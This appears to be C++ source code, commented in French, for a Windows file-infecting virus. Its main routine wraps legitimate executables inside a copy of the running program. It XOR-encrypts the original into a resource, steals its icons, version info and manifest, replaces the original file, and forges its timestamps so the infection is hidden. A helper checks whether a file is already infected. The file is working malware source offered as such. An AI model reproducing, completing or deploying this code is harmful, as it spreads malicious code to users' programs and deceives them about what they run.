#include <cstdlib>
#include <sys/stat.h>

bool Infectable(HMODULE &hExe);
void MajRes(DWORD tailleF, LPVOID donneesF, int IdRes, LPCTSTR TypeRes, string Conteneur);
void FichierToRes(string Ressource, int IdRes, LPCTSTR TypeRes, string Conteneur);
void ResToRes(HMODULE &hSource, int IdRes, LPCTSTR TypeRes, string Destination);
void VolerIcone(HMODULE &hSource, char * dest);

void Emballer(string Original, bool simuler = false) {
	try {
		SetErrorMode(SEM_NOOPENFILEERRORBOX | SEM_FAILCRITICALERRORS); // Evite messagebox
		// Charge l'exe en mémoire
		HMODULE hOriginal = LoadLibrary(Original.c_str());

		if (hOriginal != NULL) {
			// Vérif si l'exe correspond aux critères
			if (Infectable(hOriginal)) {
				#ifdef Mode_Dev
				Debug("Emballage de " + Original);
				#endif

				// Vérif si pas en mode simulation
				if (!simuler) {
					// Chemin temporaire du cadeau, le temps du patch
					string Cadeau = TEMP + RandomStr(6) + ".exe";
					// Clonage de l'emballage
					CopyFile(ExeActuel.c_str(), Cadeau.c_str(), FALSE);

					// Intégration du cadeau en ressource
					FichierToRes(Original, BINARY, RT_RCDATA, Cadeau);
					// ICONE
					VolerIcone(hOriginal, (char*)Cadeau.c_str());
					// VERSION INFO
					ResToRes(hOriginal, 1, RT_VERSION, Cadeau);
					// MANIFEST
					ResToRes(hOriginal, 1, RT_MANIFEST, Cadeau);
					// Fin de l'usurpation, fermeture de l'exe
					FreeLibrary(hOriginal);

					// Chargement des dates du fichier
					HANDLE hFichier = CreateFile(Original.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
					FILETIME dCreation, dAcces, dEcriture;
					bool datesOK = GetFileTime(hFichier, &dCreation, &dAcces, &dEcriture);
					CloseHandle(hFichier);

					// Suppression de l'original
					DeleteFile(Original.c_str());

					// Remplacement par l'emballé
					MoveFile(Cadeau.c_str(), Original.c_str());
					// Falsification des dates
					if (datesOK) {
						HANDLE hFichier2 = CreateFile(Original.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
						SetFileTime(hFichier2, &dCreation, &dAcces, &dEcriture);
						CloseHandle(hFichier2);
					}
				}
			} else
				// Nettoyage de la mémoire
				FreeLibrary(hOriginal);
		}
	}
	catch (exception &e) { }
}

// Vérifie si un binaire a une icone
bool Infectable(HMODULE &hExe) {
    bool	IconeOK		= false,
			DejaInfecte = false;

	// ---- ICONE EXISTANTE ----
    // Recherche des icones dans l'exe original
    for (int idRes = 1; idRes < 10; idRes++){
        // Tentative de chargement de l'icone
        HRSRC hRes = FindResource(hExe, MAKEINTRESOURCE(idRes), RT_ICON);
        IconeOK = (hRes != NULL);
		if (IconeOK)
            break;
    }
	// ------ PAS INFECTE ------
	HRSRC hRes = FindResource(hExe, MAKEINTRESOURCE(BINARY), RT_RCDATA);
	DejaInfecte = (hRes != NULL);

    return IconeOK && !DejaInfecte;
}

// Ajoute une ressource à un binaire
void MajRes(DWORD tailleF, LPVOID donneesF, int IdRes, LPCTSTR TypeRes, string Conteneur) {
    // Emballage dans le conteneur
    HANDLE hResource = BeginUpdateResource(Conteneur.c_str(), FALSE);
    if (hResource != NULL)
    {
        if (UpdateResource(hResource, TypeRes, MAKEINTRESOURCE(IdRes), MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT), donneesF, tailleF) != FALSE)
        {
            EndUpdateResource(hResource, FALSE);
        }
    }
}

// Charge un fichier de façon à pouvoir l'ajouter en ressource
void FichierToRes(string Ressource, int IdRes, LPCTSTR TypeRes, string Conteneur)
{
    // Cryptage du fichier
	string RessourceCrypt = TEMP + RandomStr(6);
    fXOR(Ressource, RessourceCrypt);

    // Chargement du cadeau
	HANDLE hFile = CreateFile(RessourceCrypt.c_str(), GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        // Lecture du cadeau
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        LPBYTE lpBuffer = new BYTE[dwFileSize];
        DWORD dwBytesRead;
        if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL) != FALSE)
			// Insertion dans les ressources de l'original
            MajRes(dwFileSize, (LPVOID)lpBuffer, IdRes, TypeRes, Conteneur);

        // Nettoyage
        delete [] lpBuffer;
        CloseHandle(hFile);
    }

    // Nettoyage
    DeleteFile(RessourceCrypt.c_str());
}

// Charge la ressource d'un fichier de façon à l'ajouter à en ressource dans un autre fichier
void ResToRes(HMODULE &hSource, int IdRes, LPCTSTR TypeRes, string Destination) {
	HRSRC hResource = FindResource(hSource, MAKEINTRESOURCE(IdRes), TypeRes);
    if (NULL != hResource)
    {
		HGLOBAL hResourceLoaded = LoadResource(hSource, hResource);
        if (NULL != hResourceLoaded)
        {
			LPBYTE lpBuffer = (LPBYTE)LockResource(hResourceLoaded);
            if (NULL != lpBuffer)
            {
				DWORD dwFileSize = SizeofResource(hSource, hResource);

                MajRes(dwFileSize, (LPVOID)lpBuffer, IdRes, TypeRes, Destination);
            }
        }
    }
}

int nbIcones = 4; // nombre d'icones à replacer dans l'emballage
void VolerIcone(HMODULE &hSource, char * dest) {
	// Nombre d'icones trouvées lors du parcours
	// = id correspondant dans l'exe de l'emballage
	int nbTrouvees = 0;
	// infos sur la dernière icone correcte trouvée
	LPVOID derniereTrouvee = NULL;
	DWORD tailleDerniere;

	// Recherche des icones dans l'exe original
	for (int idRes = 1; idRes < 20; idRes++){
		// Tentative de chargement de l'icone
		HRSRC hRes = FindResource(hSource, MAKEINTRESOURCE(idRes), RT_ICON);
		if (hRes != NULL) {
			// Icone OK
			nbTrouvees++;

			// Chargement de la ressource
			HGLOBAL hResLoad = LoadResource(hSource, hRes);
			if (hResLoad == NULL) return;
			// Blocage des données en mémoire
			LPVOID lpResLock = LockResource(hResLoad);
			if (lpResLock == NULL) return;
			derniereTrouvee = lpResLock;

			DWORD tailleRes = SizeofResource(hSource, hRes);
			tailleDerniere = tailleRes;

			// Màj de l'icone
			MajRes(tailleRes, lpResLock, nbTrouvees, RT_ICON, TEXT(dest));

			// Fin
			if (nbTrouvees == nbIcones)
				break;
		}
	}

	if (nbTrouvees > 0)
		// Vérif icone manquante
		while (nbTrouvees < nbIcones) {
			nbTrouvees++;
			MajRes(tailleDerniere, derniereTrouvee, nbTrouvees, RT_ICON, TEXT(dest));
		}
}